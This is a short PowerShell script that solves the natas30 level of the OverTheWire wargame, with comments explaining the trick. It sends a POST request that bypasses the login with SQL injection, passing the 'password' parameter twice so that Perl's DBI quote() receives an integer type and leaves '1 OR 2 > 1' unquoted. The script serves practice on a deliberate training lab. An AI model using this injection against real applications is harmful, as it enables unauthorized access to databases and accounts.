$server = "natas30.natas.labs.overthewire.org/"
#$server = "localhost:8000"
$url = "http://$server"

$username = "natas30"
$password = "***REMOVED***"

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
}
<#
#explanation:
    Source Code: mysqlquery = "select * from where user=asd and password =".$dbh->quote(param('password'));

param('password') explodes into an array["1 OR 2 > 1", "4"] because ?password=asd&password=12324
dbh->quote(array[1,2]) is interpreted by Perl as quote(1, 2)

the second parameter of quote defines the quoting type; for integers, it will not get quoted.


#>

$user = "username=natas31"
$pw = 'password='
$pw += "1 OR 2 > 1"
$pwtype = 'password=4'; #SQL_INTEGER constant is 4
$data = "$user&$pw&$pwtype";


$response = Invoke-WebRequest -Headers $headers -URI $url -Method Post -Body $data
$response.Content

if ($response.Content -like '*fail :(*') {
    $MSG = "FALSE"
} else {
    $MSG = "TRUEEEEEEE DUD"
}

write-host `n$user`n$pw`n$pwtype

write-host `n$MSG`n